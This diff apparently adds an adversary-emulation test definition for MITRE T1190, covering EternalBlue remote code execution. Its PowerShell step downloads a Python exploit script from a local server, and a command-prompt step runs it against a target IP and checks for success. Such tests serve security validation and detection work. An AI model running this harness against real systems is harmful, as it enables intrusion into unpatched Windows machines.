@@ -1,0 +1,86 @@
+attack_technique: T1190
+display_name: 'Exploit Public-Facing Application'
+category:
+    - Initial Access
+progress: Complete
+atomic_tests:
+    - name: 'Exploit Public-Facing Application'
+      description: |
+        English: Remote code execution using EternalBlue(CVE-2017-0144)
+
+        Korean: EternalBlue(CVE-2017-0144)을 사용하여 Exploit RCE하는 기법
+       
+         - Execute : EternalBlue RCE
+         - Pre : 필요 없음
+         - Input : 공격할 대상 IP, T1190@3.py 저장 경로, T1190@3.py 다운로드 URL, 결과 파일 경로
+         - dependencies : T1190@3.py 다운로드
+         - Output : metasploit 결과 파일
+         - Post : metasploit 결과 파일 내 문자열 확인
+
+         - ISSUE : RBA_VulTest_Windows_10, RBA_VulTest_CVE-2017-0144 사용
+                   Exploit 성공까지 약 2분 정도 소요됨.
+          
+      supported_platforms:
+        - windows
+      pre:
+        prepare_executor_name: ""
+        command: ""
+      input_arguments: 
+        target_ip:
+            description: IP for Target
+            type: String
+            default: 192.168.110.94
+        T1190@3_Path:
+            description: Path to T1190@3.py (TEMP folder was added by executor)
+            type: Path
+            default: T1190\T1190@3.py
+        T1190@3_Donwload_Url:
+            description: T1190@3.py Download URL
+            type: Url
+            default: http://127.0.0.1:8080/T1190/T1190@3.py
+        output_file:
+            description: Path where results will be placed
+            type: Path
+            default: '%TEMP%\T1190\T1190@3_result.txt'
+      dependency_executor_name: powershell
+      dependencies:
+        - description: |
+            T1190@3.py must exist on disk at specified location ($env:TEMP\#{T1190@3_Path})
+          prereq_command: |
+            if (Test-Path $env:TEMP\#{T1190@3_Path}) { exit 0 } else { exit 1 }
+          get_prereq_command: |
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            New-Item -ItemType Directory (Split-Path $env:TEMP\#{T1190@3_Path}) -Force | Out-Null
+            Invoke-WebRequest #{T1190@3_Donwload_Url} -OutFile $env:TEMP\#{T1190@3_Path}
+      executor:
+        name: command_prompt
+        command: |
+            for %%I in (#{output_file}) do set folder=%%~dpI
+            mkdir %folder%
+            python %TEMP%\#{T1190@3_Path} #{output_file} #{target_ip}
+      output:
+        output_executor_name: command_prompt
+        command: |
+            dir #{output_file}
+      post:
+        post_executor_name: command_prompt
+        command: |
+            type #{output_file} | findstr "Exploit successful." && exit 0 || exit 1 
+      technique_remote: True
+      source:
+        pre_state: 
+          - Compromised : True
+          - OS_type : Windows
+          - OS_status : Running
+          - SMB_s : Not Unavailable
+      dest:
+        pre_state:
+          - Compromised : False
+          - Reachable : True
+          - Discovered : True
+          - SMB : True
+          - SMB_s : Running
+          - SMB_v : CVE-1
+        post_state:
+          - Compromised : True
+          - Privilege : User
